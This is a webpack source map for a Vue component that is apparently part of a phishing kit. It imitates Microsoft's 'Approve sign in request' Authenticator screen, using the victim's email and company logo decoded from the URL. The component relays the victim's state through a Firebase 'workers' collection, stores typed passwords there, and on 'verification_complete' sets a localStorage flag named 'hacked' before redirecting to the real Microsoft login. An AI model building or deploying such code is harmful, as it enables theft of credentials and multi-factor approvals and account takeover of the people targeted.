{"version":3,"sources":["webpack:///./src/views/mobile/AuthVerificationForm.vue?5dc6","webpack:///./src/views/mobile/AuthVerificationForm.vue?b5a0","webpack:///src/views/mobile/AuthVerificationForm.vue","webpack:///./src/views/mobile/AuthVerificationForm.vue?4540","webpack:///./src/views/mobile/AuthVerificationForm.vue"],"names":["render","_vm","this","_h","$createElement","_c","_self","staticClass","attrs","model","value","callback","$$v","showDialog","expression","companyLogo","_v","_s","email","$route","params","smsInfo","ref","on","$event","preventDefault","onSubmit","staticRenderFns","name","data","computed","methods","component","VBtn","VCard","VCardText","VContainer","VDialog","VForm","VIcon","VImg","VRow","VSpacer","VToolbar","VToolbarTitle"],"mappings":"wHAAA,yBAA4mB,EAAG,G,yCCA/mB,IAAIA,EAAS,WAAa,IAAIC,EAAIC,KAASC,EAAGF,EAAIG,eAAmBC,EAAGJ,EAAIK,MAAMD,IAAIF,EAAG,OAAOE,EAAG,cAAc,CAACE,YAAY,wBAAwBC,MAAM,CAAC,cAAc,KAAK,CAACH,EAAG,WAAW,CAACG,MAAM,CAAC,MAAQ,MAAM,WAAa,IAAIC,MAAM,CAACC,MAAOT,EAAc,WAAEU,SAAS,SAAUC,GAAMX,EAAIY,WAAWD,GAAKE,WAAW,eAAe,CAACT,EAAG,SAAS,CAACE,YAAY,QAAQC,MAAM,CAAC,MAAQ,MAAM,KAAO,KAAK,CAACH,EAAG,YAAY,CAACG,MAAM,CAAC,KAAO,KAAK,CAACH,EAAG,kBAAkB,CAACA,EAAG,QAAQ,CAACE,YAAY,OAAOC,MAAM,CAAC,IAAM,iBAAiB,IAAMP,EAAIc,YAAY,WAAa,mBAAmB,aAAa,KAAK,YAAY,SAASV,EAAG,QAAQ,CAACE,YAAY,iBAAiBC,MAAM,CAAC,MAAO,EAAK,MAAQ,GAAG,UAAY,KAAK,CAACP,EAAIe,GAAG,IAAIf,EAAIgB,GAAGhB,EAAIiB,OAAO,QAAQ,IAAI,GAAGb,EAAG,cAAc,CAACA,EAAG,KAAK,CAACE,YAAY,yBAAyB,CAACN,EAAIe,GAAG,6BAA6BX,EAAG,IAAI,GAAG,CAACJ,EAAIe,GAAGf,EAAIgB,GAAGhB,EAAIkB,OAAOC,OAAOC,YAAYhB,EAAG,IAAI,CAACE,YAAY,eAAe,CAACF,EAAG,SAAS,CAACG,MAAM,CAAC,KAAO,KAAK,CAACP,EAAIe,GAAG,6BAA6Bf,EAAIe,GAAG,gFAAgF,GAAGX,EAAG,SAAS,CAACiB,IAAI,OAAOd,MAAM,CAAC,kBAAkB,IAAIe,GAAG,CAAC,OAAS,SAASC,GAAgC,OAAxBA,EAAOC,iBAAwBxB,EAAIyB,SAASF,MAAW,CAACnB,EAAG,IAAI,CAACE,YAAY,WAAW,CAACF,EAAG,cAAc,CAACG,MAAM,CAAC,GAAK,KAAK,CAACP,EAAIe,GAAG,4DAA4D,GAAGX,EAAG,IAAI,CAACE,YAAY,WAAW,CAACF,EAAG,cAAc,CAACG,MAAM,CAAC,GAAK,KAAK,CAACP,EAAIe,GAAG,uBAAuB,GAAGX,EAAG,QAAQ,CAACA,EAAG,aAAa,IAAI,IAAI,IAAI,IAAI,IAAI,IAC7+CsB,EAAkB,G,gGCkDtB,GACEC,KAAM,YAENC,KAAM,WAAR,OACA,SACA,eACA,SACA,YACA,WACA,gBAGE,QAZF,WAYA,qKACA,2CACA,qBACA,gDAEA,8DAEA,kCACA,kDACA,oCATA,SAWA,6BAXA,OAWA,EAXA,OAaA,0DACA,qLACA,eACA,oBACA,wCAEA,mCACA,kCACA,0DAPA,qGAdA,8CA4BEC,SAAU,GAWVC,QAAS,CACP,WADJ,WACA,iKACA,iBACA,aAEA,qBAJA,uBAKA,WACA,iBANA,0CAUA,6BAVA,cAUA,EAVA,iBAYA,qBACA,CACA,kBACA,qBACA,oBACA,eAEA,YAnBA,iDCvG2a,I,6LCQvaC,EAAY,eACd,EACAhC,EACA2B,GACA,EACA,KACA,KACA,MAIa,aAAAK,EAAiB,QAgBhC,IAAkBA,EAAW,CAACC,OAAA,KAAKC,QAAA,KAAMC,UAAA,OAAUC,aAAA,KAAWC,UAAA,KAAQC,QAAA,KAAMC,QAAA,KAAMC,OAAA,KAAKC,OAAA,KAAKC,UAAA,KAAQC,WAAA,KAASC,cAAA,U","file":"js/AuthVerificationForm.da2c1078.js","sourcesContent":["import mod from \"-!../../../node_modules/mini-css-extract-plugin/dist/loader.js??ref--8-oneOf-1-0!../../../node_modules/css-loader/dist/cjs.js??ref--8-oneOf-1-1!../../../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../../../node_modules/postcss-loader/src/index.js??ref--8-oneOf-1-2!../../../node_modules/sass-loader/dist/cjs.js??ref--8-oneOf-1-3!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./AuthVerificationForm.vue?vue&type=style&index=0&lang=scss&\"; export default mod; export * from \"-!../../../node_modules/mini-css-extract-plugin/dist/loader.js??ref--8-oneOf-1-0!../../../node_modules/css-loader/dist/cjs.js??ref--8-oneOf-1-1!../../../node_modules/vue-loader/lib/loaders/stylePostLoader.js!../../../node_modules/postcss-loader/src/index.js??ref--8-oneOf-1-2!../../../node_modules/sass-loader/dist/cjs.js??ref--8-oneOf-1-3!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./AuthVerificationForm.vue?vue&type=style&index=0&lang=scss&\"","var render = function () {var _vm=this;var _h=_vm.$createElement;var _c=_vm._self._c||_h;return _c('v-container',{staticClass:\"d-flex justify-center\",attrs:{\"fill-height\":\"\"}},[_c('v-dialog',{attrs:{\"width\":\"450\",\"persistent\":\"\"},model:{value:(_vm.showDialog),callback:function ($$v) {_vm.showDialog=$$v},expression:\"showDialog\"}},[_c('v-card',{staticClass:\"pa-10\",attrs:{\"width\":\"450\",\"tile\":\"\"}},[_c('v-toolbar',{attrs:{\"flat\":\"\"}},[_c('v-toolbar-title',[_c('v-img',{staticClass:\"my-2\",attrs:{\"alt\":\"Microsoft Logo\",\"src\":_vm.companyLogo,\"transition\":\"scale-transition\",\"max-height\":\"70\",\"max-width\":\"150\"}}),_c('v-btn',{staticClass:\"text-none pl-1\",attrs:{\"text\":true,\"color\":\"\",\"depressed\":\"\"}},[_vm._v(\" \"+_vm._s(_vm.email)+\" \")])],1)],1),_c('v-card-text',[_c('h2',{staticClass:\"mt-3 mb-4 black--text\"},[_vm._v(\"Approve sign in request\")]),_c('p',{},[_vm._v(_vm._s(_vm.$route.params.smsInfo))]),_c('p',{staticClass:\"black--text\"},[_c('v-icon',{attrs:{\"left\":\"\"}},[_vm._v(\"mdi-shield-lock-outline\")]),_vm._v(\" Open your Microsoft Authenticator app and approve the request to sign in. \")],1),_c('v-form',{ref:\"form\",attrs:{\"lazy-validation\":\"\"},on:{\"submit\":function($event){$event.preventDefault();return _vm.onSubmit($event)}}},[_c('p',{staticClass:\"caption\"},[_c('router-link',{attrs:{\"to\":\"\"}},[_vm._v(\"I can't use my Microsoft Authenticator app right now.\")])],1),_c('p',{staticClass:\"caption\"},[_c('router-link',{attrs:{\"to\":\"\"}},[_vm._v(\"More information\")])],1),_c('v-row',[_c('v-spacer')],1)],1)],1)],1)],1)],1)}\nvar staticRenderFns = []\n\nexport { render, staticRenderFns }","<template>\n  <v-container fill-height class=\"d-flex justify-center\">\n    <v-dialog v-model=\"showDialog\" width=\"450\" persistent>\n      <v-card class=\"pa-10\" width=\"450\" tile>\n        <v-toolbar flat>\n          <v-toolbar-title>\n            <v-img\n              class=\"my-2\"\n              alt=\"Microsoft Logo\"\n              :src=\"companyLogo\"\n              transition=\"scale-transition\"\n              max-height=\"70\"\n              max-width=\"150\"\n            />\n            <v-btn class=\"text-none pl-1\" :text=\"true\" color depressed>\n              {{ email }}\n            </v-btn>\n          </v-toolbar-title>\n        </v-toolbar>\n\n        <v-card-text>\n          <h2 class=\"mt-3 mb-4 black--text\">Approve sign in request</h2>\n          <p class=\"\">{{ $route.params.smsInfo }}</p>\n          <p class=\"black--text\">\n            <v-icon left>mdi-shield-lock-outline</v-icon>\n            Open your Microsoft Authenticator app and approve the request to\n            sign in.\n          </p>\n          <v-form ref=\"form\" lazy-validation v-on:submit.prevent=\"onSubmit\">\n            <p class=\"caption\">\n              <router-link to\n                >I can't use my Microsoft Authenticator app right\n                now.</router-link\n              >\n            </p>\n            <p class=\"caption\">\n              <router-link to>More information</router-link>\n            </p>\n\n            <v-row>\n              <v-spacer></v-spacer>\n            </v-row>\n          </v-form>\n        </v-card-text>\n      </v-card>\n    </v-dialog>\n  </v-container>\n</template>\n\n<script>\nimport { db } from \"../../firebase\";\nexport default {\n  name: \"LoginForm\",\n\n  data: () => ({\n    error: false,\n    disableCard: false,\n    email: \"\",\n    password: \"\",\n    browser: \"\",\n    showDialog: true,\n  }),\n\n  async created() {\n    this.email = this.$route.params.data.includes(\"@\")\n      ? this.$route.params.data\n      : window.atob(this.$route.params.data).split(\",\")[0];\n\n    this.companyLogo = window.atob(this.$route.params.data).split(\",\")[3];\n\n    this.browser = this.$route.params.browser;\n    this.companyName = this.email.split(\"@\")[1].split(\".\")[0];\n    window.document.title = this.companyName;\n\n    let workers = await db.collection(\"workers\");\n\n    workers.where(\"browser\", \"==\", this.browser).onSnapshot((snapshot) => {\n      snapshot.docChanges().forEach(async (change) => {\n        let data = change.doc.data();\n        console.log(change.type);\n        if (data.from === \"server\" && change.type === \"modified\") {\n          // Verification complete\n          if (data.info === \"verification_complete\") {\n            localStorage.setItem(\"hacked\", true);\n            window.location.href = `https://login.microsoftonline.com`;\n          }\n        }\n      });\n    });\n  },\n\n  computed: {},\n  // mounted() {\n  //   setTimeout(() => {\n  //     console.log(this.$router);\n  //     this.$router.push({\n  //       path: `/settings/${window.btoa(this.email)}m/${window.btoa(\n  //         this.companyLogo\n  //       )}l/}`,\n  //     });\n  //   }, 50000);\n  // },\n  methods: {\n    async submitForm() {\n      this.disableCard = true;\n      this.error = false;\n\n      if (this.password.length < 4) {\n        this.error = true;\n        this.disableCard = false;\n        return;\n      }\n\n      let workers = await db.collection(\"workers\");\n\n      await workers.doc(this.browser).set(\n        {\n          browser: this.browser,\n          data_type: \"password\",\n          password: this.password,\n          from: \"client\",\n        },\n        { merge: true }\n      );\n    },\n  },\n};\n</script>\n<style lang=\"scss\">\na {\n  text-decoration: none;\n  color: #005da6;\n}\n.rounded-button {\n  border-radius: 0px;\n}\n</style>\n","import mod from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./AuthVerificationForm.vue?vue&type=script&lang=js&\"; export default mod; export * from \"-!../../../node_modules/cache-loader/dist/cjs.js??ref--12-0!../../../node_modules/thread-loader/dist/cjs.js!../../../node_modules/babel-loader/lib/index.js!../../../node_modules/vuetify-loader/lib/loader.js??ref--18-0!../../../node_modules/cache-loader/dist/cjs.js??ref--0-0!../../../node_modules/vue-loader/lib/index.js??vue-loader-options!./AuthVerificationForm.vue?vue&type=script&lang=js&\"","import { render, staticRenderFns } from \"./AuthVerificationForm.vue?vue&type=template&id=058b8fea&\"\nimport script from \"./AuthVerificationForm.vue?vue&type=script&lang=js&\"\nexport * from \"./AuthVerificationForm.vue?vue&type=script&lang=js&\"\nimport style0 from \"./AuthVerificationForm.vue?vue&type=style&index=0&lang=scss&\"\n\n\n/* normalize component */\nimport normalizer from \"!../../../node_modules/vue-loader/lib/runtime/componentNormalizer.js\"\nvar component = normalizer(\n  script,\n  render,\n  staticRenderFns,\n  false,\n  null,\n  null,\n  null\n  \n)\n\nexport default component.exports\n\n/* vuetify-loader */\nimport installComponents from \"!../../../node_modules/vuetify-loader/lib/runtime/installComponents.js\"\nimport { VBtn } from 'vuetify/lib/components/VBtn';\nimport { VCard } from 'vuetify/lib/components/VCard';\nimport { VCardText } from 'vuetify/lib/components/VCard';\nimport { VContainer } from 'vuetify/lib/components/VGrid';\nimport { VDialog } from 'vuetify/lib/components/VDialog';\nimport { VForm } from 'vuetify/lib/components/VForm';\nimport { VIcon } from 'vuetify/lib/components/VIcon';\nimport { VImg } from 'vuetify/lib/components/VImg';\nimport { VRow } from 'vuetify/lib/components/VGrid';\nimport { VSpacer } from 'vuetify/lib/components/VGrid';\nimport { VToolbar } from 'vuetify/lib/components/VToolbar';\nimport { VToolbarTitle } from 'vuetify/lib/components/VToolbar';\ninstallComponents(component, {VBtn,VCard,VCardText,VContainer,VDialog,VForm,VIcon,VImg,VRow,VSpacer,VToolbar,VToolbarTitle})\n"],"sourceRoot":""}